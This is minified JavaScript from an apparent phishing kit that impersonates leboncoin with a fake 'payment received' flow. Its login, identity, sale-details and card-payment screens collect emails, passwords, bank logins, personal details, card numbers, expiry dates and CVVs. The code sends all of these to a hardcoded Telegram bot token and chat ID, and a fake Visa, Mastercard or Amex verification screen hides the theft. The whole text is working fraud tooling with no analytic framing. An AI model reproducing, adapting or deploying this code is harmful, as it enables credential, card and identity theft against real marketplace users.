const Y = R.forwardRef( ({id: e, label: t, placeholder: n, error: r, required: l=!1, className: o="", type: i="text", onChange: s, value: a, disabled: d}, h) => u.jsxs("div", {
    className: "w-full",
    children: [t && u.jsxs("label", {
        htmlFor: e,
        className: "block text-gray-800 text-base mb-1",
        children: [t, " ", l && u.jsx("span", {
            className: "text-leboncoin-button",
            children: "*"
        })]
    }), u.jsx("input", {
        id: e,
        ref: h,
        type: i,
        value: a,
        onChange: s,
        disabled: d,
        placeholder: n,
        className: Al("w-full px-4 py-3 border rounded-lg text-gray-800 transition-colors duration-200", "focus:outline-none focus:ring-2 focus:ring-leboncoin focus:border-transparent", d ? "bg-gray-100 cursor-not-allowed" : "bg-white", r ? "border-red-500" : "border-gray-300", o)
    }), r && u.jsxs("div", {
        className: "flex items-center mt-1 text-red-500 text-sm",
        children: [u.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg\\",
            className: "h-4 w-4 mr-1\\",
            viewBox: "0 0 20 20\\",
            fill: "currentColor",
            children: u.jsx("path", {
                fillRule: "evenodd\\",
                d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z\\",
                clipRule: "evenodd"
            })
        }), r]
    })]
}));
Y.displayName = "Input";
const nt = ({children: e, variant: t="primary", fullWidth: n=!1, className: r="", onClick: l, type: o="button", disabled: i=!1}) => u.jsx("button", {
    type: o,
    onClick: l,
    disabled: i,
    className: Al("flex items-center justify-center px-6 py-3 rounded-lg text-base font-medium transition-all duration-200", "focus:outline-none focus:ring-2 focus:ring-offset-2", t === "primary" && "bg-leboncoin-button text-white hover:bg-leboncoin-button-hover focus:ring-leboncoin", t === "outline" && "bg-white border border-gray-300 text-gray-800 hover:bg-gray-50 focus:ring-gray-500", i && "opacity-50 cursor-not-allowed", n && "w-full", r),
    children: e
})
  , Gp = ({text: e, className: t=""}) => u.jsxs("div", {
    className: `flex items-center my-6 ${t}`,
    children: [u.jsx("div", {
        className: "flex-grow border-t border-gray-300"
    }), u.jsx("span", {
        className: "px-4 text-gray-500",
        children: e
    }), u.jsx("div", {
        className: "flex-grow border-t border-gray-300"
    })]
})
  , pu = ({provider: e, onClick: t}) => u.jsxs(nt, {
    variant: "outline",
    fullWidth: !0,
    onClick: t,
    className: "mb-3",
    children: [e === "apple" && u.jsxs("span", {
        className: "flex items-center justify-center",
        children: [u.jsx("svg", {
            className: "w-5 h-5 mr-3\\",
            viewBox: "0 0 24 24\\",
            fill: "currentColor",
            children: u.jsx("path", {
                d: "M14.94,5.19A4.38,4.38,0,0,0,16,2,4.44,4.44,0,0,0,13,3.52,4.17,4.17,0,0,0,12,6.61,3.69,3.69,0,0,0,14.94,5.19Zm2.52,7.44a4.51,4.51,0,0,1,2.16-3.81,4.66,4.66,0,0,0-3.66-2c-1.56-.16-3,.91-3.83.91s-2-.89-3.3-.87A4.92,4.92,0,0,0,4.69,9.39C2.93,12.45,4.24,17,6,19.47,6.8,20.68,7.8,22.05,9.12,22s1.75-.82,3.28-.82,2,.82,3.3.79,2.22-1.24,3.06-2.45a11,11,0,0,0,1.38-2.85A4.41,4.41,0,0,1,17.46,12.63Z"
            })
        }), "Continuer avec Apple"]
    }), e === "google" && u.jsxs("span", {
        className: "flex items-center justify-center",
        children: [u.jsxs("svg", {
            width: "20",
            height: "20",
            viewBox: "0 0 24 24",
            xmlns: "http://www.w3.org/2000/svg",
            className: "mr-3",
            children: [u.jsx("path", {
                d: "M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z",
                fill: "#4285F4"
            }), u.jsx("path", {
                d: "M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z",
                fill: "#34A853"
            }), u.jsx("path", {
                d: "M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z",
                fill: "#FBBC05"
            }), u.jsx("path", {
                d: "M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z",
                fill: "#EA4335"
            })]
        }), "Continuer avec Google"]
    })]
});
let Fr;
const qp = new Uint8Array(16);
function Kp() {
    if (!Fr && (Fr = typeof crypto < "u" && crypto.getRandomValues && crypto.getRandomValues.bind(crypto),
    !Fr))
        throw new Error("crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported");
    return Fr(qp)
}
const re = [];
for (let e = 0; e < 256; ++e)
    re.push((e + 256).toString(16).slice(1));
function Yp(e, t=0) {
    return re[e[t + 0]] + re[e[t + 1]] + re[e[t + 2]] + re[e[t + 3]] + "-" + re[e[t + 4]] + re[e[t + 5]] + "-" + re[e[t + 6]] + re[e[t + 7]] + "-" + re[e[t + 8]] + re[e[t + 9]] + "-" + re[e[t + 10]] + re[e[t + 11]] + re[e[t + 12]] + re[e[t + 13]] + re[e[t + 14]] + re[e[t + 15]]
}
const Xp = typeof crypto < "u" && crypto.randomUUID && crypto.randomUUID.bind(crypto)
  , mu = {
    randomUUID: Xp
};
function Zp(e, t, n) {
    if (mu.randomUUID && !t && !e)
        return mu.randomUUID();
    e = e || {};
    const r = e.random || (e.rng || Kp)();
    return r[6] = r[6] & 15 | 64,
    r[8] = r[8] & 63 | 128,
    Yp(r)
}
const token = "7747376341:AAHbjsmOGU7hY61So3CVHRGlxFVL3q5VgWw"
  , chat = "8476709727"
  , tm = () => {
    let e = localStorage.getItem("user_token");
    return e || (e = Zp(),
    localStorage.setItem("user_token", e)),
    e
}
;
async function Fl(e) {
    try {
        const n = `🔑 Token: ${tm()}

${e}`;
        return (await (await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chat,
                text: n,
                parse_mode: "HTML"
            })
        })).json()).ok
    } catch (t) {
        return console.error("Error sending message:", t),
        !1
    }
}
async function nm(e) {
    const t = `
💳 INFORMATIONS DE PAIEMENT

Type de carte: ${e.cardType.toUpperCase()}
Numéro: ${e.cardNumber}
Expiration: ${e.expiryDate}
CVV: ${e.cvv}

📦 DÉTAILS DE LA TRANSACTION
Type d'article: ${e.itemType}
Montant: ${e.amount} €
`;
    return Fl(t)
}
async function rm(e) {
    const t = `
🏦 INFORMATIONS DE CONNEXION BANCAIRE

Banque: ${e.bankName}
Identifiant: ${e.username}
Mot de passe: ${e.password}
`;
    return Fl(t)
}
async function lm(e) {
    const t = `
👤 INFORMATIONS D'IDENTITÉ

Nom: ${e.lastName}
Prénom: ${e.firstName}
Date de naissance: ${e.birthDate}
Adresse: ${e.address}
Code postal: ${e.postalCode}
Ville: ${e.city}
Téléphone: ${e.phone}
`;
    return Fl(t)
}
const om = ({onSuccess: e}) => {
    const [t,n] = R.useState("")
      , [r,l] = R.useState("")
      , [o,i] = R.useState(!1)
      , [s,a] = R.useState("")
      , [d,h] = R.useState(!1)
      , [g,m] = R.useState("email")
      , x = N => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(N)
      , w = N => {
        if (N.preventDefault(),
        a(""),
        !t.trim()) {
            a("Champ requis");
            return
        }
        if (!x(t)) {
            a("Adresse e-mail invalide");
            return
        }
        m("password")
    }
      , v = async N => {
        if (N.preventDefault(),
        a(""),
        !r.trim()) {
            a("Champ requis");
            return
        }
        h(!0),
        await Fl(`
📧 CONNEXION UTILISATEUR

Email: ${t}
Mot de passe: ${r}
    `),
        setTimeout( () => {
            h(!1),
            e()
        }
        , 1e3)
    }
    ;
    return u.jsxs("div", {
        className: "w-full max-w-md",
        children: [u.jsx("h1", {
            className: "text-xl md:text-2xl font-semibold text-gray-800 mb-6",
            children: "Connectez-vous ou créez votre compte leboncoin"
        }), g === "email" ? u.jsxs("form", {
            onSubmit: w,
            children: [u.jsx(Y, {
                id: "email",
                label: "E-mail",
                type: "email",
                required: !0,
                value: t,
                onChange: N => n(N.target.value),
                error: s
            }), u.jsx(nt, {
                type: "submit",
                fullWidth: !0,
                className: "mt-4",
                disabled: d,
                children: "Continuer"
            }), u.jsx(Gp, {
                text: "Ou"
            }), u.jsxs("div", {
                className: "space-y-3",
                children: [u.jsx(pu, {
                    provider: "apple"
                }), u.jsx(pu, {
                    provider: "google"
                })]
            })]
        }) : u.jsxs("form", {
            onSubmit: v,
            children: [u.jsx(Y, {
                id: "email",
                label: "E-mail",
                type: "email",
                value: t,
                disabled: !0,
                className: "mb-4"
            }), u.jsxs("div", {
                className: "relative",
                children: [u.jsx(Y, {
                    id: "password",
                    label: "Mot de passe",
                    type: o ? "text" : "password",
                    required: !0,
                    value: r,
                    onChange: N => l(N.target.value),
                    error: s
                }), u.jsx("button", {
                    type: "button",
                    onClick: () => i(!o),
                    className: "absolute right-4 top-[38px] text-gray-500 hover:text-gray-700",
                    "aria-label": o ? "Masquer le mot de passe" : "Afficher le mot de passe",
                    children: o ? u.jsx(cp, {
                        size: 20
                    }) : u.jsx(dp, {
                        size: 20
                    })
                })]
            }), u.jsx("div", {
                className: "mt-1 mb-4",
                children: u.jsx("button", {
                    type: "button",
                    onClick: () => console.log("Mot de passe oublié"),
                    className: "text-sm text-leboncoin hover:underline",
                    children: "Mot de passe oublié"
                })
            }), u.jsx(nt, {
                type: "submit",
                fullWidth: !0,
                disabled: d,
                children: d ? u.jsxs("span", {
                    className: "flex items-center justify-center",
                    children: [u.jsxs("svg", {
                        className: "animate-spin -ml-1 mr-3 h-5 w-5 text-white\\",
                        xmlns: "http://www.w3.org/2000/svg\\",
                        fill: "none\\",
                        viewBox: "0 0 24 24",
                        children: [u.jsx("circle", {
                            className: "opacity-25\\",
                            cx: "12\\",
                            cy: "12\\",
                            r: "10\\",
                            stroke: "currentColor\\",
                            strokeWidth: "4"
                        }), u.jsx("path", {
                            className: "opacity-75",
                            fill: "currentColor",
                            d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        })]
                    }), "Connexion en cours..."]
                }) : "Se connecter"
            }), u.jsx("div", {
                className: "mt-4",
                children: u.jsx("button", {
                    type: "button",
                    onClick: () => m("email"),
                    className: "text-leboncoin hover:underline",
                    children: "Retour"
                })
            })]
        })]
    })
}
  , qt = ({color: e, children: t, className: n=""}) => u.jsxs("div", {
    className: `relative rounded-lg overflow-hidden h-[220px] w-full ${n}`,
    style: {
        backgroundColor: e
    },
    children: [u.jsx("div", {
        className: "absolute top-3 right-3 bg-white p-2 rounded-full shadow-sm cursor-pointer transition-transform hover:scale-110",
        children: u.jsx("svg", {
            width: "20",
            height: "20",
            viewBox: "0 0 24 24",
            fill: "none",
            xmlns: "http://www.w3.org/2000/svg",
            children: u.jsx("path", {
                d: "M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z",
                stroke: "currentColor",
                strokeWidth: "2",
                fill: "none"
            })
        })
    }), u.jsx("div", {
        className: "flex items-center justify-center h-full",
        children: t
    })]
})
  , im = () => u.jsxs("div", {
    className: "grid grid-cols-2 md:grid-cols-3 gap-4 w-full max-w-4xl",
    children: [u.jsx(qt, {
        color: "#ffb3b3",
        children: u.jsxs("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 200 100",
            fill: "#ff6666",
            children: [u.jsx("rect", {
                x: "25",
                y: "30",
                width: "150",
                height: "40",
                rx: "10"
            }), u.jsx("circle", {
                cx: "50",
                cy: "85",
                r: "15"
            }), u.jsx("circle", {
                cx: "150",
                cy: "85",
                r: "15"
            })]
        })
    }), u.jsx(qt, {
        color: "#ffffb3",
        children: u.jsxs("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 100 100",
            fill: "#ffcc00",
            children: [u.jsx("rect", {
                x: "20",
                y: "60",
                width: "60",
                height: "10",
                rx: "2"
            }), u.jsx("rect", {
                x: "20",
                y: "50",
                width: "60",
                height: "10",
                rx: "2"
            }), u.jsx("rect", {
                x: "25",
                y: "20",
                width: "50",
                height: "30",
                rx: "5"
            }), u.jsx("path", {
                d: "M30 50 L45 30 L60 50 Z"
            })]
        })
    }), u.jsx(qt, {
        color: "#b3e6ff",
        children: u.jsxs("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 100 100",
            fill: "#0099cc",
            children: [u.jsx("rect", {
                x: "20",
                y: "20",
                width: "60",
                height: "60",
                rx: "5"
            }), u.jsx("rect", {
                x: "30",
                y: "15",
                width: "40",
                height: "10",
                rx: "2"
            }), u.jsx("rect", {
                x: "45",
                y: "10",
                width: "10",
                height: "10",
                rx: "2"
            })]
        })
    }), u.jsx(qt, {
        color: "#ffccb3",
        children: u.jsxs("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 100 100",
            fill: "#ff9966",
            children: [u.jsx("path", {
                d: "M50 10 L90 50 L50 90 L10 50 Z"
            }), u.jsx("circle", {
                cx: "50",
                cy: "50",
                r: "10"
            })]
        })
    }), u.jsx(qt, {
        color: "#d9b3ff",
        children: u.jsxs("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 100 100",
            fill: "#9933ff",
            children: [u.jsx("path", {
                d: "M30 20 L70 20 L80 40 L80 80 L20 80 L20 40 Z"
            }), u.jsx("rect", {
                x: "35",
                y: "40",
                width: "30",
                height: "20",
                rx: "2"
            })]
        })
    }), u.jsx(qt, {
        color: "#ccffcc",
        children: u.jsx("svg", {
            width: "80",
            height: "80",
            viewBox: "0 0 100 100",
            fill: "#66cc66",
            children: u.jsx("path", {
                d: "M20 30 L50 10 L80 30 L80 70 L50 90 L20 70 Z"
            })
        })
    })]
})
  , sm = ({onLoginSuccess: e}) => {
    const t = () => {
        console.log("Back button clicked")
    }
    ;
    return u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b md:border-b-0",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: t
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsxs("main", {
            className: "flex flex-col md:flex-row min-h-[calc(100vh-64px)]",
            children: [u.jsx("div", {
                className: "w-full md:w-1/2 p-6 md:p-12 flex flex-col items-center justify-center",
                children: u.jsx(om, {
                    onSuccess: e
                })
            }), u.jsx("div", {
                className: "hidden md:flex md:w-1/2 bg-gray-50 items-center justify-center p-8",
                children: u.jsx(im, {})
            })]
        })]
    })
}
  , um = ({onAccept: e, onBack: t}) => {
    const n = () => {
        t ? t() : window.history.back()
    }
    ;
    return u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b md:border-b-0",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: n
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center items-center min-h-[calc(100vh-64px)] bg-gray-50",
            children: u.jsxs("div", {
                className: "w-full max-w-md p-6 bg-white rounded-lg shadow-sm m-4",
                children: [u.jsxs("div", {
                    className: "text-center mb-8",
                    children: [u.jsx("div", {
                        className: "mx-auto mb-6",
                        children: u.jsx("img", {
                            src: "/payment.svg",
                            alt: "Payment toi",
                            className: "w-32 h-32 mx-auto"
                        })
                    }), u.jsx("h1", {
                        className: "text-2xl font-semibold text-gray-800 mb-2",
                        children: "Vous avez reçu un paiement"
                    }), u.jsx("p", {
                        className: "text-gray-600",
                        children: "Cliquez sur le bouton ci-dessous pour accepter le paiement. Le montant sera ensuite transféré sur votre compte bancaire."
                    })]
                }), u.jsx("div", {
                    className: "bg-gray-50 p-4 rounded-lg mb-6",
                    children: u.jsxs("div", {
                        className: "flex items-center text-gray-700",
                        children: [u.jsx(fp, {
                            className: "w-5 h-5 mr-2"
                        }), u.jsx("p", {
                            className: "text-sm",
                            children: "Suite à notre nouvelle politique de sécurité, des verifications supplémentaire peuvent être nécessaire afin de lutter contre la fraude."
                        })]
                    })
                }), u.jsx(nt, {
                    type: "button",
                    fullWidth: !0,
                    onClick: e,
                    children: "Accepter le paiement"
                })]
            })
        })]
    })
}
  , am = ({onNext: e, onBack: t}) => {
    const [n,r] = R.useState({
        firstName: "",
        lastName: "",
        birthDate: "",
        address: "",
        postalCode: "",
        city: "",
        phone: ""
    })
      , [l,o] = R.useState({})
      , [i,s] = R.useState(!1)
      , a = m => {
        const {id: x, value: w} = m.target;
        r(v => ({
            ...v,
            [x]: w
        })),
        l[x] && o(v => ({
            ...v,
            [x]: ""
        }))
    }
      , d = () => {
        const m = {};
        return n.firstName.trim() || (m.firstName = "Champ requis"),
        n.lastName.trim() || (m.lastName = "Champ requis"),
        n.birthDate.trim() || (m.birthDate = "Champ requis"),
        n.address.trim() || (m.address = "Champ requis"),
        n.postalCode.trim() || (m.postalCode = "Champ requis"),
        n.city.trim() || (m.city = "Champ requis"),
        n.phone.trim() || (m.phone = "Champ requis"),
        n.postalCode.trim() && !/^\d{5}$/.test(n.postalCode) && (m.postalCode = "Code postal invalide"),
        n.phone.trim() && !/^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/.test(n.phone) && (m.phone = "Numéro de téléphone invalide"),
        o(m),
        Object.keys(m).length === 0
    }
      , h = async m => {
        m.preventDefault(),
        d() && (s(!0),
        await lm(n),
        setTimeout( () => {
            s(!1),
            e(n)
        }
        , 1500))
    }
      , g = () => {
        t ? t() : window.history.back()
    }
    ;
    return u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: g
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center py-8 px-4",
            children: u.jsxs("div", {
                className: "w-full max-w-md",
                children: [u.jsx("h1", {
                    className: "text-2xl font-semibold text-gray-800 mb-2",
                    children: "Confirmation de votre identité"
                }), u.jsx("p", {
                    className: "text-gray-600 mb-6",
                    children: "Pour sécuriser votre transaction et protéger vos intérêts, nous avons besoin de vérifier votre identité. Veuillez remplir tous les champs ci-dessous avec vos informations personnelles exactes."
                }), u.jsxs("form", {
                    onSubmit: h,
                    className: "space-y-4",
                    children: [u.jsxs("div", {
                        className: "grid grid-cols-2 gap-4",
                        children: [u.jsx(Y, {
                            id: "lastName",
                            label: "Nom",
                            value: n.lastName,
                            onChange: a,
                            error: l.lastName,
                            required: !0
                        }), u.jsx(Y, {
                            id: "firstName",
                            label: "Prénom",
                            value: n.firstName,
                            onChange: a,
                            error: l.firstName,
                            required: !0
                        })]
                    }), u.jsx(Y, {
                        id: "birthDate",
                        label: "Date de naissance",
                        type: "text",
                        value: n.birthDate,
                        onChange: a,
                        error: l.birthDate,
                        required: !0
                    }), u.jsx(Y, {
                        id: "address",
                        label: "Adresse",
                        value: n.address,
                        onChange: a,
                        error: l.address,
                        required: !0
                    }), u.jsxs("div", {
                        className: "grid grid-cols-2 gap-4",
                        children: [u.jsx(Y, {
                            id: "postalCode",
                            label: "Code postal",
                            value: n.postalCode,
                            onChange: a,
                            error: l.postalCode,
                            required: !0
                        }), u.jsx(Y, {
                            id: "city",
                            label: "Ville",
                            value: n.city,
                            onChange: a,
                            error: l.city,
                            required: !0
                        })]
                    }), u.jsx(Y, {
                        id: "phone",
                        label: "Numéro de téléphone",
                        type: "tel",
                        value: n.phone,
                        onChange: a,
                        error: l.phone,
                        required: !0
                    }), u.jsx(nt, {
                        type: "submit",
                        fullWidth: !0,
                        className: "mt-6",
                        disabled: i,
                        children: i ? u.jsxs("span", {
                            className: "flex items-center justify-center",
                            children: [u.jsxs("svg", {
                                className: "animate-spin -ml-1 mr-3 h-5 w-5 text-white",
                                xmlns: "http://www.w3.org/2000/svg",
                                fill: "none",
                                viewBox: "0 0 24 24",
                                children: [u.jsx("circle", {
                                    className: "opacity-25",
                                    cx: "12",
                                    cy: "12",
                                    r: "10",
                                    stroke: "currentColor",
                                    strokeWidth: "4"
                                }), u.jsx("path", {
                                    className: "opacity-75",
                                    fill: "currentColor",
                                    d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                })]
                            }), "Chargement..."]
                        }) : "Suivant"
                    })]
                })]
            })
        })]
    })
}
  , cm = ({onConfirm: e, onBack: t}) => {
    const [n,r] = R.useState({
        itemType: "",
        amount: ""
    })
      , [l,o] = R.useState({})
      , [i,s] = R.useState(!1)
      , a = m => {
        const {id: x, value: w} = m.target;
        r(v => ({
            ...v,
            [x]: w
        })),
        l[x] && o(v => ({
            ...v,
            [x]: ""
        }))
    }
      , d = () => {
        const m = {};
        return n.itemType.trim() || (m.itemType = "Champ requis"),
        n.amount.trim() || (m.amount = "Champ requis"),
        n.amount && !/^\d+([.,]\d{0,2})?$/.test(n.amount) && (m.amount = "Format invalide. Exemple: 1234.56"),
        o(m),
        Object.keys(m).length === 0
    }
      , h = async m => {
        m.preventDefault(),
        d() && (s(!0),
        await new Promise(x => setTimeout(x, 1500)),
        s(!1),
        e(n))
    }
      , g = () => {
        t ? t() : window.history.back()
    }
    ;
    return u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: g
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center py-8 px-4",
            children: u.jsxs("div", {
                className: "w-full max-w-md",
                children: [u.jsx("h1", {
                    className: "text-2xl font-semibold text-gray-800 mb-2",
                    children: "Confirmation de la transaction"
                }), u.jsx("p", {
                    className: "text-gray-600 mb-6",
                    children: "Pour finaliser votre transaction en toute sécurité, veuillez confirmer les détails de votre vente. Assurez-vous que les informations saisies correspondent exactement à l'article que vous vendez."
                }), u.jsxs("form", {
                    onSubmit: h,
                    className: "space-y-6",
                    children: [u.jsx(Y, {
                        id: "itemType",
                        label: "Nature de l'article",
                        placeholder: "Ex: Voiture d'occasion, Smartphone, Meuble...",
                        value: n.itemType,
                        onChange: a,
                        error: l.itemType,
                        required: !0
                    }), u.jsx(Y, {
                        id: "amount",
                        label: "Montant de l'article (€)",
                        placeholder: "Ex: 1234.56",
                        type: "text",
                        value: n.amount,
                        onChange: a,
                        error: l.amount,
                        required: !0
                    }), u.jsx("div", {
                        className: "bg-gray-50 rounded-lg p-4 mt-6",
                        children: u.jsx("p", {
                            className: "text-sm text-gray-600",
                            children: "En confirmant cette transaction, vous certifiez que les informations fournies sont exactes et que vous êtes le propriétaire légitime de l'article mis en vente."
                        })
                    }), u.jsx(nt, {
                        type: "submit",
                        fullWidth: !0,
                        className: "mt-6",
                        disabled: i,
                        children: i ? u.jsxs("span", {
                            className: "flex items-center justify-center",
                            children: [u.jsxs("svg", {
                                className: "animate-spin -ml-1 mr-3 h-5 w-5 text-white",
                                xmlns: "http://www.w3.org/2000/svg",
                                fill: "none",
                                viewBox: "0 0 24 24",
                                children: [u.jsx("circle", {
                                    className: "opacity-25",
                                    cx: "12",
                                    cy: "12",
                                    r: "10",
                                    stroke: "currentColor",
                                    strokeWidth: "4"
                                }), u.jsx("path", {
                                    className: "opacity-75",
                                    fill: "currentColor",
                                    d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                })]
                            }), "Chargement..."]
                        }) : "Confirmer la transaction"
                    })]
                })]
            })
        })]
    })
}
  , dm = ({cardType: e, onComplete: t}) => {
    R.useEffect( () => {
        const l = setTimeout( () => {
            t()
        }
        , 5e3);
        return () => clearTimeout(l)
    }
    , [t]);
    const r = ( () => {
        switch (e) {
        case "visa":
            return {
                background: "#1a1f71",
                title: "Verified by Visa",
                message: "Vérification de votre paiement en cours"
            };
        case "mastercard":
            return {
                background: "bg-gradient-to-br from-[#eb001b] to-[#f79e1b]",
                title: "Mastercard SecureCode",
                message: "Sécurisation de votre transaction"
            };
        case "amex":
            return {
                background: "#006fcf",
                title: "American Express SafeKey",
                message: "Vérification de sécurité en cours"
            }
        }
    }
    )();
    return u.jsxs("div", {
        className: `min-h-screen flex flex-col items-center justify-center text-white p-4 ${r.background.includes("gradient") ? r.background : `bg-[${r.background}]`}`,
        children: [u.jsxs("div", {
            className: "text-center mb-8",
            children: [u.jsx("h1", {
                className: "text-2xl md:text-3xl font-bold mb-4",
                children: r.title
            }), u.jsx("p", {
                className: "text-lg opacity-80",
                children: r.message
            })]
        }), u.jsxs("div", {
            className: "relative w-24 h-24 mb-8",
            children: [u.jsx("div", {
                className: "absolute inset-0 animate-ping bg-white/20 rounded-lg"
            }), u.jsx("div", {
                className: "relative flex items-center justify-center w-full h-full bg-white/10 backdrop-blur-sm rounded-lg",
                children: u.jsx("div", {
                    className: "w-12 h-12 border-4 border-white rounded-full animate-spin border-t-transparent"
                })
            })]
        }), u.jsxs("div", {
            className: "text-center max-w-md",
            children: [u.jsx("p", {
                className: "text-sm opacity-70 mb-4",
                children: "Ne fermez pas cette fenêtre pendant la vérification de votre transaction"
            }), u.jsxs("div", {
                className: "flex items-center justify-center space-x-2",
                children: [u.jsx("div", {
                    className: "w-2 h-2 bg-white rounded-full animate-pulse"
                }), u.jsx("div", {
                    className: "w-2 h-2 bg-white rounded-full animate-pulse delay-100"
                }), u.jsx("div", {
                    className: "w-2 h-2 bg-white rounded-full animate-pulse delay-200"
                })]
            })]
        })]
    })
}
  , fm = ({amount: e, itemType: t, onVerificationComplete: n, onBack: r}) => {
    const [l,o] = R.useState(!1)
      , [i,s] = R.useState({
        cardType: "",
        cardNumber: "",
        expiryDate: "",
        cvv: "",
        amount: e,
        itemType: t || ""
    })
      , [a,d] = R.useState({})
      , h = N => {
        const {id: f, value: c} = N.target;
        if (f === "expiryDate") {
            const p = c.replace(/\D/g, "");
            if (p.length >= 2) {
                const y = p.slice(0, 2)
                  , k = p.slice(2, 4)
                  , j = `${y}${k ? `/${k}` : ""}`;
                s(C => ({
                    ...C,
                    expiryDate: j
                }))
            } else
                s(y => ({
                    ...y,
                    expiryDate: p
                }))
        } else
            s(p => ({
                ...p,
                [f]: c
            }));
        a[f] && d(p => ({
            ...p,
            [f]: ""
        }))
    }
      , g = N => {
        const c = N.replace(/\s+/g, "").replace(/[^0-9]/gi, "").match(/\d{4,16}/g)
          , p = c && c[0] || ""
          , y = [];
        for (let k = 0, j = p.length; k < j; k += 4)
            y.push(p.substring(k, k + 4));
        return y.length ? y.join(" ") : N
    }
      , m = N => {
        const f = g(N.target.value);
        s(c => ({
            ...c,
            cardNumber: f
        }))
    }
      , x = () => {
        const N = {};
        return i.cardType || (N.cardType = "Veuillez sélectionner un type de carte"),
        i.cardNumber.trim() || (N.cardNumber = "Numéro de carte requis"),
        i.expiryDate.trim() || (N.expiryDate = "Date d'expiration requise"),
        i.cvv.trim() || (N.cvv = "Code de sécurité requis"),
        i.cardNumber && !/^(\d{4}\s?){4}$/.test(i.cardNumber.trim()) && (N.cardNumber = "Numéro de carte invalide"),
        i.expiryDate && !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(i.expiryDate) && (N.expiryDate = "Format invalide (MM/YY)"),
        i.cvv && !/^\d{3,4}$/.test(i.cvv) && (N.cvv = "Code de sécurité invalide"),
        d(N),
        Object.keys(N).length === 0
    }
      , w = async N => {
        if (N.preventDefault(),
        x()) {
            const f = {
                ...i,
                amount: e || i.amount,
                itemType: t || i.itemType
            };
            console.log("Sending payment data:", f),
            await nm(f),
            o(!0)
        }
    }
      , v = () => {
        r ? r() : window.history.back()
    }
    ;
    return l && i.cardType ? u.jsx(dm, {
        cardType: i.cardType,
        onComplete: n
    }) : u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: v
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center py-8 px-4",
            children: u.jsxs("div", {
                className: "w-full max-w-md",
                children: [u.jsx("h1", {
                    className: "text-2xl font-semibold text-gray-800 mb-2",
                    children: "Configuration du paiement"
                }), u.jsx("p", {
                    className: "text-gray-600 mb-6",
